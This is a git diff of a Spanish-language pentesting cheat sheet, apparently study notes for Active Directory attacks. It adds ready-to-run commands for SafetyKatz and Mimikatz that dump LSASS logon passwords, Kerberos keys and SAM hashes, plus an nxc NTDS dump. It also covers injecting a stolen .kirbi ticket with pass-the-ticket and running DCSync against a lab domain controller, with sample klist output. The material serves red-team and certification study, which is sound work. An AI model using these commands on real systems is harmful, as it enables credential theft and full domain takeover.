@@ -62,7 +62,7 @@ TIP:  <-IMPORTANTE
 ❯ nxc smb <IP> -u 'user1' -p 'Password1!' --ntds 
 ```
 
-## Safetykatz - Mimikatz  
+## Safetykatz
 ```powershell 
 ! Usuario local con permisos de Administrador 
 
@@ -73,10 +73,13 @@ TIP:  <-IMPORTANTE
 ❯ Loader.exe -path SafetyKatz.exe -args "privilege::evasive-debug" "sekurlsa::evasive-logonpasswords" "exit" 
 ❯ Loader.exe -path SafetyKatz.exe -args "privilege::evasive-debug" "sekurlsa::evasive-keys" "exit" 
 
+```
 
-
+## Mimikatz
+```powershell 
 # Extraer desde LSASS las claves de cifrado Kerberos (AES, RC4, etc.) de las sesiones de usuarios en el sistema.
-❯ .\mimikatz.exe -Command "privilege::debug"  
+❯ .\mimikatz.exe "privilege::debug" "token::elevate" "lsadump::sam" "exit"
+❯ .\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
 
 	sekurlsa::logonpasswords
 	skurlsa::logonpasswords /full
@@ -86,4 +89,41 @@ TIP:  <-IMPORTANTE
 	lsadump::sam 
 	token::elevate
 	exit
+
+```
+
+## Mimikatz - Inyectar archivo (.Kirbi) a la sesión 
+```bash 
+192.168.107.175      DC01.LAINOSCP.local         LAINOSCP.local        DC01
+       │                    │                         │                 │
+       │                    │                         │                 └─ Hostname
+       │                    │                         └─ Dominio DNS
+       │                    └─ FQDN del equipo
+       └─ IP
+
+❯ net group "Domain Admins" /domain  # Mirar administradores del dominio 
+❯ nltest /dclist:LAINOSCP.local 
+```
+
+```powershell 
+# Si existe un ticket ya creado 'administrator.kirbi' se puede importar a la sesión 
+❯ C:\Temp\mimikatz.exe "kerberos::ptt administrator.kirbi" "exit"
+❯ klist   # Mirar si se importo 
+
+#0>	Client: Administrator @ LAINOSCP.LOCAL
+	Server: krbtgt/LAINOSCP.local @ LAINOSCP.LOCAL
+	KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
+	Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize 
+	Start Time: 10/10/2026 14:55:07 (local)
+	End Time:   10/11/2026 0:55:07 (local)
+	Renew Time: 10/17/2026 14:55:07 (local)
+	Session Key Type: RSADSI RC4-HMAC(NT)
+	Cache Flags: 0x1 -> PRIMARY 
+	Kdc Called: 
+
+
+EJEMPLO: DCSync
+❯ C:\Temp\mimikatz.exe "lsadump::dcsync /domain:<Dominio DNS> /dc:<FQDN del equipo> /user:<NetBIOS>\administrator" "exit" 
+
+❯ C:\Temp\mimikatz.exe "lsadump::dcsync /domain:LAINOSCP.local /dc:DC01.LAINOSCP.local /user:lainoscp\administrator" "exit"   # Hacer un DCSync 
 ```
